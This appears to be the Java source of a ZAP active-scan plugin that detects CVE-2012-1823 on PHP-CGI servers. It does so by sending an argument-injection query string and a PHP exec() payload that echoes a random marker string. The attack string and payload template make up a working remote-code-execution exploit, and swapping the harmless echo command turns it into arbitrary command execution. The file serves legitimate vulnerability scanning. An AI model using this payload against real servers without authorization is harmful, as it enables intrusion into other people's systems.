/*
 * Zed Attack Proxy (ZAP) and its related class files.
*
* ZAP is an HTTP/HTTPS proxy for assessing web application security.
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
*   http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*/
package org.zaproxy.zap.extension.ascanrulesBeta;

import org.apache.commons.httpclient.HttpStatus;
import org.apache.commons.httpclient.URI;
import org.apache.commons.lang.RandomStringUtils;
import org.apache.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.AbstractAppPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.network.HttpMessage;
import org.parosproxy.paros.network.HttpRequestHeader;
import org.zaproxy.zap.model.Vulnerabilities;
import org.zaproxy.zap.model.Vulnerability;

/**
* a scanner that looks for, and exploits CVE-2012-1823 to perform Remote Code Execution on a PHP-CGI web server
* 
* @author 70pointer
*
*/
public class RemoteCodeExecutionCVE20121823 extends AbstractAppPlugin {
	
	/**
	 * details of the vulnerability which we are attempting to find 
	 * WASC 20 = Improper Input Handling
	 */
	private static final Vulnerability vuln = Vulnerabilities.getVulnerability("wasc_20");

	/**
	 * the logger object
	 */
	private static final Logger log = Logger.getLogger(RemoteCodeExecutionCVE20121823.class);

	/**
	 * a random string (which remains constant across multiple runs, as long as Zap is not 
	 */
	static String randomString = RandomStringUtils.random(20, "abcdefghijklmnopqrstuvwxyz0123456789");

	/**
	 * returns the plugin id
	 */
	@Override
	public int getId() {
		return 20018;
	}

	/**
	 * returns the name of the plugin
	 */
	@Override
	public String getName() {
		return Constant.messages.getString("ascanbeta.remotecodeexecution.cve-2012-1823.name");
	}

	@Override
	public String[] getDependency() {
		return null;
	}

	@Override
	public String getDescription() {
		if (vuln != null) {
			return vuln.getDescription();
		}
		return "Failed to load vulnerability description from file";
	}

	@Override
	public int getCategory() {
		return Category.INFO_GATHER;
	}

	@Override
	public String getSolution() {
		if (vuln != null) {
			return vuln.getSolution();
		}
		return "Failed to load vulnerability solution from file";
	}

	@Override
	public String getReference() {
		if (vuln != null) {
			StringBuilder sb = new StringBuilder();
			for (String ref : vuln.getReferences()) {
				if (sb.length() > 0) {
					sb.append('\n');
				}
				sb.append(ref);
			}
			return sb.toString();
		}
		return "Failed to load vulnerability reference from file";
	}

	@Override
	public void init() {		
	}


	@Override
	public void scan() {
		try {
			String attackParam = "?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input";
			String payloadBoilerPlate = "<?php exec('<<<<COMMAND>>>>',$colm);echo join(\"\n\",$colm);die();?>";
			String [] payloads = {
					payloadBoilerPlate.replace("<<<<COMMAND>>>>", "cmd.exe /C echo "+ randomString), 
					payloadBoilerPlate.replace("<<<<COMMAND>>>>", "echo "+ randomString)
					};
			//tries payloads for Linux/Unix, and Windows until we find something that works
			for ( String payload : payloads) {
				URI originalURI = getBaseMsg().getRequestHeader().getURI();
				byte [] originalResponseBody = getBaseMsg().getResponseBody().getBytes();
				
				//construct a new URL based on the original URL, but without any of the original parameters
				//important: the URL is already escaped, and must not be escaped again
				URI attackURI = new URI(originalURI.getScheme() + "://" + originalURI.getAuthority() + (originalURI.getPath() != null?originalURI.getPath():"/") + attackParam, true);
				//and send it as a POST request, unauthorised, with the payload as the POST body.
				HttpRequestHeader requestHeader = new HttpRequestHeader(HttpRequestHeader.POST, attackURI, HttpRequestHeader.HTTP11);
				HttpMessage attackmsg = new HttpMessage(requestHeader);
				attackmsg.setRequestBody(payload);
				
				sendAndReceive(attackmsg, false); //do not follow redirects
				byte [] attackResponseBody = attackmsg.getResponseBody().getBytes();
				String responseBody = new String(attackResponseBody);
				
				//if the command was not recognised (by the host OS), we get a response size of 0 on PHP, but not on Tomcat
				//to be sure it's not a false positive, we look for a string to be echoed  
				if (	attackmsg.getResponseHeader().getStatusCode() == HttpStatus.SC_OK 
						&& attackResponseBody.length>= randomString.length()
						&& responseBody.startsWith(randomString)						
						) {
					if ( log.isDebugEnabled() ) {
						log.debug("Remote Code Execution alert for: "+ originalURI.getURI());
					}
						
					//bingo.
					bingo(	Alert.RISK_HIGH, 
						Alert.WARNING,
						Constant.messages.getString("ascanbeta.remotecodeexecution.cve-2012-1823.name"),
						Constant.messages.getString("ascanbeta.remotecodeexecution.cve-2012-1823.desc"), 
						null, // originalMessage.getRequestHeader().getURI().getURI(),
						null, // parameter being attacked: none.
						payload,  // attack: none (it's not a parameter being attacked)
						responseBody, //extrainfo
						Constant.messages.getString("ascanbeta.remotecodeexecution.cve-2012-1823.soln"),
						responseBody,		//evidence, highlighted in the message
						attackmsg	//raise the alert on the attack message
						);	
				}
			}			
		} catch (Exception e) {
			log.error("Error scanning a URL for Remote Code Execution via CVE-2012-1823: " + e.getMessage(), e);
		}
	}
	
	@Override
	public int getRisk() {
		return Alert.RISK_HIGH; 
	}

	@Override
	public int getCweId() {
		return 20;  //Improper Input Validation
	}

	@Override
	public int getWascId() {
		return 20;  //Improper Input Handling
	}
}
